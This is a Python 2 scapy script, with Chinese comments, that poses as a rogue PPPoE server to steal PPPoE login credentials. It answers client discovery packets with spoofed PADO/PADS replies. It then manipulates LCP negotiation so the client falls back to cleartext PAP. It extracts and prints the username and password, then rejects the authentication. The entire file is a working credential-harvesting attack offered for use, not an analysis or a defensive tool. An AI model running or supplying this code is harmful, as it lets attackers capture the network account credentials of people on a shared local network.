# coding:utf-8

'''
@author Karblue
@date 2016年2月27日
'''

import struct
import uuid
import copy

import scapy.all as scapy
from scapy.layers.ppp import *

MAC_ADDRESS = "0a:0a:0a:0a:0a:0a"


# 不适用于多网卡
def get_mac_address():
    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
    return ":".join([mac[e:e + 2] for e in range(0, 11, 2)])


class PPPoEServer(object):
    def __init__(self):
        self.clientMap = {}

    # 开始监听
    def start(self):
        scapy.sniff(lfilter=self.filterData)

    # 过滤pppoe数据
    def filterData(self, raw):
        if hasattr(raw, "type"):
            _type2Method = {
                #发现阶段
                0x8863: {
                    "code": {
                        #PADI
                        0x09: (self.send_pado_packet, "PADI阶段开始,发送PADO..."),
                        #PADR
                        0x19: (self.send_pads_packet, "PADR阶段开始,发送PADS...")
                    }
                },
                #会话阶段
                0x8864:{
                    "proto":{
                        #LCP链路处理
                        0xc021:(self.send_lcp_req,"欺骗成功,开始处理数据..."),
                        #PAP协议处理
                        0xc023:(self.get_papinfo,"获取账号信息...")
                    }
                }
            }
            if raw.type in _type2Method:
                _nMethod = _type2Method[raw.type]
                for k, v in _nMethod.items():
                    _nVal = getattr(raw, k)
                    if _nVal in _nMethod[k]:
                        _nObj = _nMethod[k][_nVal]
                        print _nObj[1]
                        _nObj[0](raw)


    #处理lcp-req请求
    def send_lcp_req(self,raw):
        if raw.load[0] == "\x01":
            print "收到LCP-Config-Req"
            #第一次收到req 请求,直接拒绝
            if raw.src not in self.clientMap:
                self.send_lcp_reject_packet(raw)
                #self.send_lcp_reject_packet(raw)
                self.send_lcp_req_packet(raw)
                self.clientMap[raw.src] = {"req": 1, "ack": 0}

            #无论何时收到req,返回原始ack
            self.send_lcp_ack_packet(raw)
            print "发送LCP-Config-Ack"

    # 解析pap账号密码
    def get_papinfo(self, raw):
        # pap-req
        if raw.load[0] == "\x01":
            _payLoad = raw.load
            _nUserLen = struct.unpack("!B", _payLoad[4])[0]
            _nPassLen = struct.unpack("!B", _payLoad[5 + _nUserLen])[0]
            _userName = _payLoad[5:5 + _nUserLen]
            _passWord = _payLoad[6 + _nUserLen:6 + _nUserLen + _nPassLen]
            print "get User:%s,Pass:%s" % (_userName, _passWord)
            self.send_pap_authreject(raw)
            if raw.src in self.clientMap:
                del self.clientMap[raw.src]

            print "欺骗完毕...."


    # 发送pap拒绝验证
    def send_pap_authreject(self, raw):
        raw.dst, raw.src = raw.src, raw.dst
        raw.load = "\x03\x02\x00\x06\x01\x00"
        scapy.sendp(raw)

    # 发送lcp-config-ack回执包
    def send_lcp_ack_packet(self, raw):
        raw = copy.deepcopy(raw)
        raw.dst, raw.src = raw.src, raw.dst
        raw.load = "\x02" + raw.load[1:]
        scapy.sendp(raw)

    #发送lcp-config-reject回执包
    def send_lcp_reject_packet(self, raw):
        raw = copy.deepcopy(raw)
        raw.dst, raw.src = raw.src, raw.dst
        raw.load = "\x04" + raw.load[1:]
        scapy.sendp(raw)

    #发送lcp-config-req回执包
    def send_lcp_req_packet(self, raw):
        #实际client payload
        raw = copy.deepcopy(raw)
        raw.dst, raw.src = raw.src, raw.dst
        _rawnLoad = raw.load
        #插入PAP认证
        _payload = "\x01\x04\x05\xc8\x03\x04\xc0\x23\x05\x06\x5e\x63\x0a\xb8\x00\x00\x00\x00"
        raw.load = "\x01\x01\x00" + chr(len(_payload)) + _payload
        scapy.sendp(raw)


    #发送pa*系列包格式
    def send_pa_packet(self, raw, **kwargs):
        raw.src, raw.dst = MAC_ADDRESS, raw.src
        #寻找客户端的Host_Uniq
        _host_Uniq = self.padi_find_hostuniq(raw.load)
        _payload = "\x01\x01\x00\x00\x01\x02\x00\x03^_^"
        if _host_Uniq:
            _payload += _host_Uniq

        raw.len = len(_payload)
        raw.load = _payload
        for k, v in kwargs.items():
            setattr(raw, k, v)

        scapy.sendp(raw)

    #发送lcp-termination会话终止包
    def send_lcp_end_packet(self, raw):
        _pkt = Ether(src=raw.dst, dst=raw.src, type=0x8863) / PPPoE(version=0x1, type=0x1, code=0xA7, sessionid=0x01, len=0)
        scapy.sendp(_pkt)

    #发送PADS回执包
    def send_pads_packet(self, raw):
        return self.send_pa_packet(raw, code=0x65, sessionid=0x01)


    #发送PADO回执包
    def send_pado_packet(self, raw):
        return self.send_pa_packet(raw, code=0x07)


    #寻找客户端发送的Host-Uniq
    def padi_find_hostuniq(self, raw):
        _key = "\x01\x03"
        if _key in raw:
            _nIdx = raw.index(_key)
            #2字节host-uniq 长度
            _nLen = struct.unpack("!H", raw[_nIdx + 2:_nIdx + 4])[0]
            #2字节长度+剩余字节
            _nData = raw[_nIdx + 2:_nIdx + 4 + _nLen]
            return _key + _nData

        return


if __name__ == "__main__":
    MAC_ADDRESS = get_mac_address()
    n = PPPoEServer()
    n.start()

